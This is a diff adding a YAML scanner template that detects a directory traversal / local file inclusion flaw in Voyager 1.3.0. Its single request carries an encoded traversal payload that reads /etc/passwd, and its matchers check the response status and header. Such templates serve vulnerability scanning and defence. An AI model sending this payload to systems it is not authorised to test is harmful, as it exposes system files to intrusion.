@@ -1,0 +1,24 @@
+id: voyager-lfi
+brief:
+    title: Voyager 1.3.0 - Directory Traversal
+    by: mammad_rahimzada
+    level: high
+    about: Voyager 1.3.0 is vulnerable to local file inclusion.
+    label:
+        - voyager
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd'
+      signs:
+        - "on": word
+          has:
+            - text/plain
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
